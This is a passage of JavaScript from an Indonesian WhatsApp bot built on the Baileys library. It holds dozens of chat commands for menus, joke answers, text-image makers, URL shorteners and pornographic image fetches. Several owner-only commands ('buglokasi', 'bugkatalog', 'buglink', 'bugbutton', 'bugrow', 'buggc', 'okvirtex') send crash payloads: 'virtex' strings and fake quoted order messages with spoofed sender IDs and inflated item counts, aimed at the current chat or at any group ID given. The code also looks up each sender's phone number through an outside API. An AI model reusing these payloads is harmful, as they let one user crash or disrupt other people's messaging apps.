if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fdoc})
       menu =` ⦿ Jam : ${jam}
⦿ Hari : ${week} ${weton}
⦿ Tanggal : ${date}

「 𝙄𝙉𝙁𝙊 𝙆𝘼𝙈𝙐 」

〆⁩ *Username:* ${pushname}
〆⁩ *Bio Info:* ${thu.status}
〆⁩ *Admin*: ${isGroupAdmins ? 'Ya' : 'No'}
〆⁩ *Premium*: ${isPremium ? 'Ya' : 'No'}
〆⁩ *Level*: ${Levelnye}
〆⁩ *XP*: ${Xpluu} / ${requiredXplu}

「 𝙄𝙉𝙁𝙊 𝘽𝙊𝙏 」

〆⁩ Prefix : ${prefixStatus ? "Multi Prefix" : "No Prefix"}
〆⁩ Runtime : ${runtime(process.uptime())}
〆⁩Total Hit : ${totalhit} Hit
〆⁩Total Chat : ${totalchat.length} Chat 
〆⁩ 𝐒𝐩𝐞𝐞𝐝 : *${latensie.toFixed(4)} _Second_*
〆⁩ 𝐀𝐜𝐭𝐢𝐯𝐞 : *${runtime(process.uptime())}*
〆⁩ 𝐏𝐥𝐚𝐭𝐟𝐨𝐫𝐦 : *Ubuntu Linux*
${readmore}

Hai Kak ${pushname}\nPilih Opsi Dibawah Ini Ya..
`

              
                

                    ronove.sendMessage(from, { contentText: `${menu}`, footerText: `┏━➤ *DEVELOPER* \n*┃┃* script bot ini di susun\n*┃┃* oleh org dibawah ini :V\n*┃┣━━━━━━━━*\n*┃┃✙◗_${namaowner}_*\n*┃┗━━━━━━━━*\n*┃✙◗ thanx to Allah*\n*┃✙◗ thanx to sa'ad sensei*\n*┃✙◗ thanx to emak&bapak*\n*┃✙◗ thanx to saya :V*\n*┃✙◗ thanx to taqi*\n*┃✙◗ thanx to vany*\n*┗━━━━━━━ •*`, buttons: [{ buttonId: `infobot`, buttonText: { displayText: 'INFO BOT' }, type: 1 },{ buttonId: `allmenu`, buttonText: { displayText: 'ALLMENU 👑' }, type: 1 },{ buttonId: `command`, buttonText: { displayText: 'MENU📒' }, type: 1 } ], headerType: 'LOCATION', locationMessage: { degreesLatitude: '', degreesLongitude: '', jpegThumbnail: iye, contextInfo: {mentionedJid: [sender]}}}, 'buttonsMessage')
                    buffer = fs.readFileSync(`./stik/ara.mp3`)
ronove.sendMessage(from, buffer, audio, { mimetype: 'audio/mp4', quoted: fg3, ptt: true })
              break
       case 'hobby':
             const kan =['Coli','baca buku','Tadi','ngeliat org mandi','Nonton bokep','sepedaan','Baca wattpad','belajar','Main discord','menabung']
              const hooo = kan[Math.floor(Math.random() * kan.length)]
              ronove.sendMessage(from, 'Pertanyaan : *hoby*\n\nJawaban : '+ hooo, text, { quoted: mek })
              break
       case 'bisakah':
              bisakah = body.slice(1)
              const bisa =['Bisa','Tidak Bisa','Coba Ulangi','MANA GW TAU']
              const keh = bisa[Math.floor(Math.random() * bisa.length)]
              ronove.sendMessage(from, '*Pertanyaan :* '+bisakah+'\n*Jawaban :* '+ keh, text, { quoted: mek })
              break
case 'citacita':       
			         var cita =['http://piyobot.000webhostapp.com/citacita1.mp3','http://piyobot.000webhostapp.com/citacita2.mp3','http://piyobot.000webhostapp.com/citacita3.mp3','http://piyobot.000webhostapp.com/citacita4.mp3','http://piyobot.000webhostapp.com/citacita5.mp3','http://piyobot.000webhostapp.com/citacita6.mp3','http://piyobot.000webhostapp.com/citacita7.mp3','http://piyobot.000webhostapp.com/citacita8.mp3','http://piyobot.000webhostapp.com/citacita9.mp3','http://piyobot.000webhostapp.com/citacita10.mp3','http://piyobot.000webhostapp.com/citacita11.mp3','http://piyobot.000webhostapp.com/citacita12.mp3','http://piyobot.000webhostapp.com/citacita13.mp3','http://piyobot.000webhostapp.com/citacita14.mp3','http://piyobot.000webhostapp.com/citacita15.mp3','http://piyobot.000webhostapp.com/citacita16.mp3','http://piyobot.000webhostapp.com/citacita17.mp3','http://piyobot.000webhostapp.com/citacita18.mp3','http://piyobot.000webhostapp.com/citacita19.mp3','http://piyobot.000webhostapp.com/citacita20.mp3','http://piyobot.000webhostapp.com/citacita21.mp3','http://piyobot.000webhostapp.com/citacita22.mp3','http://piyobot.000webhostapp.com/citacita23.mp3','http://piyobot.000webhostapp.com/citacita24.mp3','http://piyobot.000webhostapp.com/citacita25.mp3','http://piyobot.000webhostapp.com/citacita26.mp3','http://piyobot.000webhostapp.com/citacita27.mp3','http://piyobot.000webhostapp.com/citacita28.mp3','http://piyobot.000webhostapp.com/citacita29.mp3','http://piyobot.000webhostapp.com/citacita30.mp3','http://piyobot.000webhostapp.com/citacita31.mp3','http://piyobot.000webhostapp.com/citacita32.mp3','http://piyobot.000webhostapp.com/citacita33.mp3','http://piyobot.000webhostapp.com/citacita34.mp3','http://piyobot.000webhostapp.com/citacita35.mp3']
                     var cita3 = cita[Math.floor(Math.random() * cita.length)]
                     cita2 = await getBuffer(cita3)
                     ronove.sendMessage(from, cita2, MessageType.audio, {quoted: fdoc, mimetype: 'audio/mp4', ptt:true, duration: -838719282910})
                     break
       case 'kapankah':
       case 'kapan':
              kapankah = body.slice(1)
              const kapan =['Besok','Lusa','Tadi','4 Hari Lagi','5 Hari Lagi','6 Hari Lagi','1 Minggu Lagi','2 Minggu Lagi','3 Minggu Lagi','1 Bulan Lagi','2 Bulan Lagi','3 Bulan Lagi','4 Bulan Lagi','5 Bulan Lagi','6 Bulan Lagi','1 Tahun Lagi','2 Tahun Lagi','3 Tahun Lagi','4 Tahun Lagi','5 Tahun Lagi','6 Tahun Lagi','1 Abad lagi','3 Hari Lagi']
              const koh = kapan[Math.floor(Math.random() * kapan.length)]
              ronove.sendMessage(from, '*Pertanyaan :* '+kapankah+'\n*Jawaban :* '+ koh, text, { quoted: mek })
              break
case 'buglokasi':

if (!isOwner && !mek.key.fromMe) return sticOwner(from)

ronove.updatePresence(from, Presence.composing)

		       ronove.sendMessage(from, {degreesLatitude: 34.0184,

						degreesLongitude: -118.411,

						name: `${namaowner}`,

						address: `${namaowner}`,

                        jpegThumbnail: iye },location,{

 quoted: {

  key: {

   participant: '111111111@s.whatsapp.net' // Fake sender Jid

  },

  message: {

   orderMessage: {

    itemCount: 70000, // Bug

    status: 1,

    surface: 1,

    message: `${namaowner}`,

    orderTitle: `${namaowner}`, // 

    sellerJid: '0@s.whatsapp.net' // Seller

   }

  }

 }

})

break      
        case 'shareloc':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        ptod = "6285347683869@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       tes = `:)`
sendButLocation(from, `${tes}`, `${yoii}Kapan kapan maen kerumah kak${yoii}`, {jpegThumbnail:serlok}, [{buttonId:`ok`,buttonText:{displayText:'Ok Kak'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'tespinn':
const textImg = (teks) => {
	qute = fs.readFileSync('./ronove.jpg') 
           return ronove.sendMessage(from, qute, image, { quoted: fgif, caption: teks })
        }
        donasi = `tes`
textImg(donasi)
break
        case 'infobot':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        ptod = "6285347683869@s.whatsapp.net"
        stod = `${sender}`
        uwu = '*``*'
        yoii = '```'
       stst = await ronove.getStatus(`${sender.split('@')[0]}@c.us`)
				stst = stst.status == 401 ? '' : stst.status
			num = await fetchJson(`https://api.telnyx.com/anonymous/v2/number_lookup/${senderNumber}`, {method: 'get'})
       menu = `
⦿ Jam : ${jam}
⦿ Hari : ${week} ${weton}
⦿ Tanggal : ${date}
${readmore}
*┏━•「 𝗠𝗔𝗜𝗡 」•━*
*┃┃* *〆⁩*.menu
*┃┣•*「 INFO BOT 」
*┃┃* *〆⁩* Prefix : ${prefixStatus ? "Multi Prefix" : "No Prefix"}
*┃┃* *〆⁩* Runtime : ${runtime(process.uptime())}
*┃┃* *〆⁩* Hit Today : ${hit_today.length} Hit
*┃┃* *〆⁩* Total Hit : ${totalhit} Hit
*┃┃* *〆⁩* Total Chat : ${totalchat.length} Chat
*┃┃*—————————————➤
*┃┣➤ *DEVELOPER* 
*┃┃* script bot ini di susun
*┃┃* oleh org dibawah ini :V
*┃┣━━━━━━━━*
*┃┃✙◗ _${namaowner}_*
*┃┗━━━━━━━━*
*┃✙◗ thanx to Allah*
*┃✙◗ thanx to sa'ad sensei*
*┃✙◗ thanx to emak&bapak*
*┃✙◗ thanx to saya :V*
*┃✙◗ thanx to taqi*
*┃✙◗ thanx to vany*
*┗━━━━━━━ •*`
sendButLocation(from, `${menu}`, `${yoii}Created By ${namaowner} 〆⁩🦢${yoii}`, {jpegThumbnail:iye}, [{buttonId:`laporan`,buttonText:{displayText:'REPORT ERROR🛠'},type:1},{buttonId:`owner`,buttonText:{displayText:'OWNER'},type:1},{buttonId:`script`,buttonText:{displayText:'SCRIPT〆⁩🦢'},type:1}], {contextInfo: { mentionedJid: [ptod,stod]}})
break
case 'auu': 
       reply('apa?0')
        sendButMessage(from, `Hai Kak ${pushname} 〆⁩`, `Mau Jawab Apa?`, [
          {
            buttonId: `oklah`,
            buttonText: {
              displayText: `kok gitu sih:)`,
            },
            type: 1,
          },
          {
            buttonId: `apaan6`,
            buttonText: {
              displayText: `Dahlah`,
            },
            type: 1,
          },
          {
            buttonId: `awokkk`,
            buttonText: {
              displayText: `end:/`,
            },
            type: 1,
          },
        ]);
        break;
case 'oklah':
reply(':v')
break
case 'apaan6':
reply('oke slur')
break
case 'awokkk':
reply('iyalah masa engga')
break

case 'isbaileys': 
case 'bail': 
case 'baileys':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!mek.key.fromMe) return;
reply(`${mek.quoted.isBaileys}`)
break
case 'getcaption':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!mek.key.fromMe) return;
try {
reply(`${mek.quoted.title}`)
} catch {
reply(`${mek.quoted.caption}`)
}
break
case 'laporan': //KIRIGIRI
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
       reply('*HALO  KACK ADA MASALAH APA DENGAN BOT NYA KAK SI LAHKAN CHAT OWNER/DEVELOPER BOT*')
        sendButMessage(from, `Hai Kak ${pushname} 〆⁩`, `Kalo Nemu Bug Sung Kasih Tau Owner Atau Creator Bot Ini〆⁩`, [
          {
            buttonId: `command`,
            buttonText: {
              displayText: `BACK⬅️`,
            },
            type: 1,
          },
          {
            buttonId: `owner`,
            buttonText: {
              displayText: `OWNER〆⁩`,
            },
            type: 1,
          },
        ]);
        break
case 'iggw':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
  reply('https://instagram.com/pranata_pasha')
break
        		        case 'darkneon':
			case 'woodblock':
			case 'paper':
			       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
			if (args.length < 1) return reply(`Contoh: ${prefix}paper ${namaowner}`)
			papg = body.slice(6)
			glass = await getBuffer(`https://videfikri.com/api/textmaker/${command}/?text=${papg}`)
			ronove.sendMessage(from, glass, image, {quoted: ftrol, caption: 'INI'})
			break
    case 'tinyurl':
           if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
         sticWait(from)
                    if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
                    short = args.join(" ")
         ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/tinyurl?url=${short}`,{method:'get'})
     get_result = ini_result.result
                ini_txt = `Tinyurl shortlink
`
                ini_txt += `Shortlink : ${get_result}`
     reply (ini_txt)
     break          
         case 'bitly':
                if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
         sticWait(from)
                    if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
                    short = args.join(" ")
         ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/bitly?url=${short}`,{method:'get'})
     get_result = ini_result.result
                ini_txt = `bitly shortlink
`
                ini_txt += `Shortlink : ${get_result}`
     reply (ini_txt)
     break          
                 case 'shorturl':
                        if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
         sticWait(from)
                    if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
                    short = args.join(" ")
         ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/shorturl?url=${short}`,{method:'get'})
     get_result = ini_result.result
                ini_txt = `shorturl shortlink
`
                ini_txt += `Shortlink : ${get_result}`
     reply (ini_txt)
     break
        case 'cuttly':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
         sticWait(from)
                    if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (url with http://)) Example: ${prefix + command} http://panel.vinny.wtf/`)
                    short = args.join(" ")
         ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/cuttly?url=${short}`,{method:'get'})
     get_result = ini_result.result
                ini_txt = `cuttly shortlink
`
                ini_txt += `Shortlink : ${get_result}`
     reply (ini_txt)
     break 
                case 'artinama':
                       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
         sticWait(from)
                    if (args.length == 0) return reply(`Format salah! dibutuhkan (${prefix + command} (nama) Example: ${prefix + command} Raisya`)
                    nama = args.join(" ")
         ini_result = await fetchJson(`http://hadi-api.herokuapp.com/api/artinama?nama=${nama}`,{method:'get'})
     get_result = ini_result.result
                ini_txt = `Arti Nama ${nama}

`
                ini_txt += `Arti : ${get_result}`
     reply (ini_txt)
     break 
        				case 'smoke':
					case 'camuflage':
					case 'stars':
					case '3dglowing':
					case 'underwaterocean':
					case 'wolfmetal':
					case 'rainbowshine':
					       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                    sticWait(from)
                    if (args.length == 0) return reply(`Example: ${prefix + command} ${namabot}`)
                    teki = args.join(" ")
                    repur = await getBuffer(`https://api.xteam.xyz/photooxy/${command}?text=${teki}&APIKEY=${xteamkey}`)
                    ronove.sendMessage(from, repur, image, { quoted: fgif})
                    break
        					case 'pornhub':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sticWait(from)
					 if (args.length == 0) return reply(`Example: ${prefix + command} ${namabot}|baik`)
                    query = args.join(" ")
					porn = `${body.slice(8)}`
					hub1 = porn.split("|")[0];
					hub2 = porn.split("|")[1];
					porn = await getBuffer(`https://api.xteam.xyz/textpro/ph?text=${hub1}&text2=${hub2}&APIKEY=${xteamkey}`)
					ronove.sendMessage(from, porn, image, {caption: 'PORNHUB', quoted: fgif})
					break 
        case 'joox':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                    if (args.length == 0) return reply(`Example: ${prefix + command} Melukis Senja`)
                    query = args.join(" ")
                    jooxbyManik = await fetchJson(`https://api.zeks.me/api/joox?apikey=${zekskey}&q=${query}`)
                    jooxbyManik = jooxbyManik.data
                    Manikbot = `Title : ${jooxbyManik.judul}\nArtists : ${jooxbyManik.artist}\size : ${jooxbyManik.size}\nAlbum : ${jooxbyManik.album}\nExt: Mp3\n`
                    thumbnail = await getBuffer(jooxbyManik.thumb)
                    ronove.sendMessage(from, thumbnail, image, { quoted: mek, caption: Manikbot })
                    get_audio = await getBuffer(jooxbyManik.download_url)
                    ronove.sendMessage(from, get_audio, audio, { mimetype: 'audio/mp4', filename: `${jooxbyManik.songname}.mp3`, quoted: mek})
                    break
        case 'infocovid':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
     ini_result = await fetchJson('https://ronove-bot-api.herokuapp.com/api/covidworld?apikey=Alphabot')
     get_result = ini_result.result
        ini_txt = `C O V I D  W O R L D
`
        ini_txt += `Total Case : ${get_result.totalCases}\n`
        ini_txt += `Deaths : ${get_result.deaths}\n`
        ini_txt += `Recovered : ${get_result.recovered}\n`
        ini_txt += `Active Cases : ${get_result.activeCases}\n`
        ini_txt += `Closed Cases : ${get_result.closedCases}\n`
        ini_txt += `lastUpdate : ${get_result.lastUpdate}`
     reply (ini_txt)
     break
case 'owner':
           case 'ᴄʀᴇᴀᴛᴏʀ':
                  if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
               sendKontak(from, `${owner}`, `${namaowner}`, 'jgn Lupa donasi ya😃')
               await sleep(1000)
               haibg =`Hai Kak ${pushname}\nItu Ownerku, Mau tau soal apa ya?`
               buttons = [{buttonId: `script`,buttonText:{displayText: 'SC BOT'},type:1},{buttonId:`iggw`,buttonText:{displayText:'INSTAGRAM'},type:1}]
               buttonsMessage = { contentText: `${haibg}`, footerText: `Created By ${namaowner} 〆⁩🦢`, buttons: buttons, headerType: 1 }
               prep = await ronove.prepareMessageFromContent(from,{buttonsMessage},{})
               ronove.relayWAMessage(prep)
               break      
case 'ass':
        case 'femdom':
        case 'hentaigif':
        case 'yuri':
        case 'ahegao':
        case 'cum':
        case 'masturbation':
        case 'jahy':
        case 'orgy':
        case 'thigs':
        case 'panties':
        case 'foot':
        case 'gangbang':
        case 'bdsm':
        case 'ero':
        case 'glasses':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
sticWait(from)
     ini_result = await fetchJson(`https://ronove-bot-api.herokuapp.com/api/nsfw/${command}?apikey=Alphabot`)

     get_result = ini_result.result

        ini_img = await getBuffer(get_result)

     ronove.sendMessage(from, ini_img, image, {quoted:mek})

     break
case 'bts':
case 'exo':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
sticWait(from)
        ini_img = await getBuffer(`https://api.xteam.xyz/randomimage/${command}?APIKEY=${xteamkey}`)
     ronove.sendMessage(from, ini_img, image, {quoted:nikak})
     break
                case 'nhengif':
                       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                    sticWait(from)
     ini_img = await getBuffer(`https://api.lolhuman.xyz/api/random2/random_hentai_gif?apikey=${lolkey}`)

     ronove.sendMessage(from, ini_img, video, { quoted:mek, mimetype : 'video/mp4', filename: 'hentai.gif' })
     break
case 'mengyoi':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!mek.key.fromMe) return;
sendBug(from)
break
case 'buggc':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!mek.key.fromMe) return;
if (!q) return reply('Masukan ID Grupnya')
sendBug(args[0])
break
case 'okvirtex':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
katalog(`${ngazap(prefix)}`)
katalog(`${emoji2(prefix)}`)
katalog(`${virtex90(prefix)}`)
katalog(`${virtex2(prefix)}`)
katalog(`${virtex3(prefix)}`)
katalog(`${virtex4(prefix)}`)
katalog(`${virtex5(prefix)}`)
katalog(`${virtex6(prefix)}`)
katalog(`${virtex7(prefix)}`)
katalog(`${virtex8(prefix)}`)
katalog(`${virtex9(prefix)}`)
katalog(`${virtag(prefix)}`)
break
case 'buglink':
                if (!isOwner && !mek.key.fromMe) return sticOwner(from)
                 ronove.toggleDisappearingMessages(from, 0)
               ronove.sendMessage(from, virtex3(prefix), text, { quoted:ftrol, contextInfo :{text: '🔥',
            "forwardingScore": 1000000000,
            isForwarded: false,
            sendEphemeral: false,
            "externalAdReply": {
                "title": `${virtex2(prefix)}`,
                "body": "",
                "previewType": "PHOTO",
                "thumbnailUrl": "https://i.ibb.co/3hrZZ6s/tsukasa.png",
                "thumbnail": fs.readFileSync(`./ronove.jpg`),
                "sourceUrl": "https://youtube.com/channel/UCeWqxS30F9D6_JFH14Y9t-g"}}})
                break
        case 'bugbutton':
        if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        ronove.toggleDisappearingMessages(from, 0)
        sendButLocation(from, `${ngazap(prefix)}`, `${virtag(prefix)}`, {jpegThumbnail:iye}, [{buttonId:`bbaij72njnwjibdo16830nslm1782`,buttonText:{displayText:'Yahahaha'},type:1}])
        ronove.toggleDisappearingMessages(from, 0)
break
case 'bugrow':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
ronove.toggleDisappearingMessages(from, 0)
 listMsg = {
 buttonText: 'LIST MENU',
 footerText: `${emoji2(prefix)}`,
 description: `${virtex6(prefix)}`,
 sections: [
                     {
                      "title": "CieKontol",
 rows: [
                          {
                              "title": "CieBug",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ronove.sendMessage(from, listMsg, MessageType.listMessage, {quoted:ftrol})
ronove.toggleDisappearingMessages(from, 0)
break
case 'vietnam':
       case 'korea':
        case 'china':
        case 'indonesia':
        case 'malaysia':
        case 'japan':
        case 'thailand':
               if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
sticWait(from)
     ini_result = await fetchJson(`https://ronove-bot-api.herokuapp.com/api/cewe/${command}?apikey=Alphabot`)

     get_result = ini_result.result

        ini_img = await getBuffer(get_result.url)

     ronove.sendMessage(from, ini_img, image, {quoted:fgif})

     break
case 'bandit':
        var menu = `                   *HALO KACK*✨    `;
        sendButVideo(from, menu, `rahman gay`, thumb, [
          {
            buttonId: `laporan`,
            buttonText: {
              displayText: `REPORT EROR⚡`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}ping`,
            buttonText: {
              displayText: `PING✗⃝⚡`,
            },
            type: 1,
          },
          {
            buttonId: `${prefix}laporan`,
            buttonText: {
              displayText: `LAPORAN✗⃝🛠️`,
            },
            type: 1,
          },
        ]);

        break
case 'bugkatalog':
if (!isOwner && !mek.key.fromMe) return sticOwner(from)
ronove.toggleDisappearingMessages(from, 0)
 babi = (teks) => {
             res = ronove.prepareMessageFromContent(from,{ "orderMessage": { "itemCount": 9999999, "message": teks, "footerText": `${emoji2(prefix)}`, "thumbnail": iye, "surface": 'CATALOG' }}, {quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
   orderMessage: {
    itemCount: 9999999, // Bug
    status: 1,
    surface: 1,
    message: `${virtex6(prefix)}`,
    orderTitle: `${emoji2(prefix)}`, // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
             ronove.relayWAMessage(res)
        }
        babi(`${ngazap(prefix)}`)
        babi(`${virtag(prefix)}`)
        babi(`${virtex6(prefix)}`)
        babi(`${emoji2(prefix)}`)
        break
              case 'dadu':
			random = Math.floor(Math.random() * 6) + 1
		damdu = fs.readFileSync(`./sticker/${random}.webp`)
			ronove.sendMessage(from, damdu, sticker, {quoted: mek})
			break
case 'command':
       if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
 listMsg = {
 buttonText: 'LIST MENU *〆⁩*',
 footerText: '©DidinSec〆⁩',
 description: `Hai kak @${sender.split('@')[0]}, Silahkan pilih menu disini`,
 sections: [
                     {
                      "title": `${jam} - ${week} ${weton} - ${date}`,
 rows: [
                          {
                              "title": "ᴀʟʟᴍᴇɴᴜ",
                              "rowId": ""
                           },
                          {
                              "title": "sᴄʀɪᴘᴛ",
                              "rowId": ""
                           },
                           {
                              "title": "sᴘᴇᴇᴅ",
                              "rowId": ""
                           },
                           {
                              "title": "sᴛᴀᴛᴜs",
                              "rowId": ""
                           },
                           {
                              "title": "ᴄʀᴇᴀᴛᴏʀ",
                              "rowId": ""
                           },
                           {
                              "title": "ᴊᴀᴅɪʙᴏᴛ",
                              "rowId": ""
                           },
                           {
                              "title": "ʀᴜɴᴛɪᴍᴇ",
                              "rowId": ""
                           },
                           {
                              "title": "ᴏᴡɴᴇʀᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "sᴛɪᴋᴇʀᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ᴍᴀᴋᴇʀᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ɢᴀᴍᴇᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                           "title": "ᴡɪʙᴜᴍᴇɴᴜ",
                           "rowId": ""
                           },
                           {
                           "title": "ᴅɪᴅɪɴsʜᴏᴘ",
                           "rowId": ""
                           },
                           {
                              "title": "ɴsғᴡᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ɢʀᴏᴜᴘᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ᴏᴛʜᴇʀᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ɢᴀᴄʜᴀᴄᴇᴄᴀɴ",
                              "rowId": ""
                           },
                           {
                              "title": "ᴅᴏᴡɴʟᴏᴀᴅᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ᴜᴘsᴡᴍᴇɴᴜ",
                              "rowId": ""
                           },
                           {
                              "title": "ɢᴄʙᴏᴛ",
                              "rowId": ""
                           },
                           {
                              "title": "sᴇᴡᴀʙᴏᴛ",
                              "rowId": ""
                           },
                           {
                              "title": "ʙᴇʟɪsᴄʙᴏᴛ",
                              "rowId": ""
                           }
                        ]
                     }],
 listType: 1
}
ronove.sendMessage(from, listMsg, MessageType.listMessage, {contextInfo: { mentionedJid: [sender]},quoted:fdoc})
break
case 'gc':
case 'ɢᴄʙᴏᴛ':                                                                 if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
const fakegrup = (teks) => {        
ronove.sendMessage(from, teks, text, { thumbnail: fake, sendEphemeral: true, quoted: fgif, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${namabot} GROUP`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`${setting.linkgcbot}`}}})
		}
menu = `ッ『 Gc Bot 』ッ
GABUNG UTK DPT INFO² MENGENAI ${namabot} YA KAK`
fakegrup(menu)
break
case 'beli':
        case 'ʙᴇʟɪsᴄʙᴏᴛ':
        if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sendButMessage(from, `${setting.txtbelisc}
`, `PEMBAYARAN CHAT OWNER KU YA`, [
          {
            buttonId: `owner`,
            buttonText: {
              displayText: `OWNER〆⁩`,
            },
            type: 1,
          },
]);
        break
       case 'jadian':
              jds = []
              jdii = groupMembers
              koss = groupMembers
              akuu = jdii[Math.floor(Math.random() * jdii.length)]
              diaa = koss[Math.floor(Math.random() * koss.length)]
              teks = `Ciee.. yang lagi jadian @${akuu.jid.split('@')[0]}  (♥️ ) @${diaa.jid.split('@')[0]} `
              jds.push(akuu.jid)
              jds.push(diaa.jid)
              mentions(teks, jds, true)
              break
    case 'kurumi':
    case 'deku':
    case 'sao':
    case 'chika':
    case 'kurumi':
    case 'kaneki':
    case 'touka':
    case 'eren':
    case 'naruto':
    case 'minato':
    case 'sagiri':
    case 'sasuke':
    case 'sakura':
    case 'tsunade':
    case 'gojosatoru':
    if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
        sticWait(from)
        anu = await fetchJson(`https://bx-hunter.herokuapp.com/api/pinterest?text=${command}&apikey=Ikyy69`, {method: 'get'})
        ngebuff = await getBuffer(anu.image)
        ronove.sendMessage(from, ngebuff, image, { quoted: floc })
        break
case 'attp':  
if (!isRegistered) return sendButMessage (from, daftar1, daftar2, daftar3, { quoted: fgif})
                     if (args.length < 1) return reply('Kasih teks lah om')
                     sticWait(from)
                     ini = args.join(' ')
                     atetepe = await getBuffer(`https://api.xteam.xyz/attp?file&text=${encodeURIComponent(ini)}`)
                     ronove.sendMessage(from, atetepe, sticker, {quoted: fgif})
                     break
// Encrypt Fiture
				case 'base64enc': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b64enc?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'base64dec': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b64dec?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'base32enc': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b32enc?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'base32dec': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(11)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/b32dec?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result)
					break
					case 'sha1enc': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(9)
					anu = await fetchJson(`https://api.xteam.xyz/encrypt/sha1?text=${gatauda}&APIKEY=${xteamkey}`)
					reply(anu.result.encrypt)
					break
					case 'sha256enc': 
				if (!isRegistered) return reply(ind.noregis())
				if (args.length < 1) return reply(`Contoh: ronove`)
					gatauda = body.slice(11)
